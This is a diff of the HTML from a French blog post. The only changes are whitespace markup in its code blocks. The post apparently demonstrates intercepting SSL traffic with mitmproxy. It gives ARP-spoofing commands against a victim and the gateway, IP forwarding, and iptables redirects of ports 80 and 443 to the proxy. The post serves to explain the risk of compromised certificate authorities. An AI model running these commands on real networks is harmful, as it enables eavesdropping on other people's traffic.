@@ -79,21 +79,21 @@ Je l&#8217;ai ajouté dans le navigateur cible pour simuler que je l&#8217;avais
 (c&#8217;est le cas si un des 1200 <span class="caps">CA</span> se fait pirater, ce qui me semble une surface
 d&#8217;attaque assez&nbsp;large).</p>
 <p>Je les colle ici si ça vous&nbsp;intéresse:</p>
-<div class="highlight"><pre><span></span><code>$ sudo aptitude install mitmproxy
-$ mitm-proxy -T --host
+<div class="highlight"><pre><span></span><code>$<span class="w"> </span>sudo<span class="w"> </span>aptitude<span class="w"> </span>install<span class="w"> </span>mitmproxy
+$<span class="w"> </span>mitm-proxy<span class="w"> </span>-T<span class="w"> </span>--host
 </code></pre></div>
 
 <p>Il faut faire croire à votre victime que vous êtes la passerelle vers
 l&#8217;extérieur et à la passerelle que vous êtes la&nbsp;victime:</p>
-<div class="highlight"><pre><span></span><code>arpspoof -i wlan0 -t victime gateway
-arpspoof -i wlan0 -t gateway victime
+<div class="highlight"><pre><span></span><code>arpspoof<span class="w"> </span>-i<span class="w"> </span>wlan0<span class="w"> </span>-t<span class="w"> </span>victime<span class="w"> </span>gateway
+arpspoof<span class="w"> </span>-i<span class="w"> </span>wlan0<span class="w"> </span>-t<span class="w"> </span>gateway<span class="w"> </span>victime
 </code></pre></div>
 
 <p>Puis dire à notre fausse passerelle de rediriger le trafic des ports 80 et 443
 vers notre&nbsp;proxy:</p>
-<div class="highlight"><pre><span></span><code>sudo sysctl -w net.ipv4.ip_forward<span class="o">=</span><span class="m">1</span>
-sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport <span class="m">443</span> -j REDIRECT --to-port <span class="m">4443</span>
-sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport <span class="m">80</span> -j REDIRECT --to-port <span class="m">4443</span>
+<div class="highlight"><pre><span></span><code>sudo<span class="w"> </span>sysctl<span class="w"> </span>-w<span class="w"> </span>net.ipv4.ip_forward<span class="o">=</span><span class="m">1</span>
+sudo<span class="w"> </span>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-i<span class="w"> </span>wlan0<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">443</span><span class="w"> </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span><span class="m">4443</span>
+sudo<span class="w"> </span>iptables<span class="w"> </span>-t<span class="w"> </span>nat<span class="w"> </span>-A<span class="w"> </span>PREROUTING<span class="w"> </span>-i<span class="w"> </span>wlan0<span class="w"> </span>-p<span class="w"> </span>tcp<span class="w"> </span>--dport<span class="w"> </span><span class="m">80</span><span class="w"> </span>-j<span class="w"> </span>REDIRECT<span class="w"> </span>--to-port<span class="w"> </span><span class="m">4443</span>
 </code></pre></div>
 
 <p>Et paf, <strong>on voit tout ce qui passe entre la machine et le serveur <span class="caps">SSL</span></strong>. On peut
